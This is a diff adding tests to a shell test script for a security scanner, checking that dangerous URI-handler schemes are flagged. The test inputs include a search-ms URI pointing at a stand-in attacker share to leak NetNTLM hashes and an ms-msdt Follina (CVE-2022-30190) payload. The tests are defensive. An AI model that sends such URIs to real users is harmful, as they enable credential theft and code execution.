@@ -7350,6 +7350,17 @@ n=$(wc -l < "$LF" | tr -d ' ')
     || check "log-file: text/esp/audit emit records" "3" "$n"
 rm -f "$LF"
 
+# ── cycle-22: URI-handler schemes, OOXML macro smuggling, GHA script
+#    injection, MCP tool-poisoning ──
+# search-ms: opens Explorer on a remote share — leaks NetNTLM
+./hlse_core 'search-ms:query=x&location=\\evil.example\share' 2>&1 \
+    | grep -q "URI-handler" \
+    && check "url: search-ms handler scheme flagged" "0" "0" \
+    || check "url: search-ms handler scheme flagged" "0" "1"
+# ms-msdt: is the Follina handler (CVE-2022-30190)
+./hlse_core 'ms-msdt:/id PCWDiagnostic' 2>&1 | grep -q "URI-handler" \
+    && check "url: ms-msdt handler scheme flagged" "0" "0" \
+    || check "url: ms-msdt handler scheme flagged" "0" "1"
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
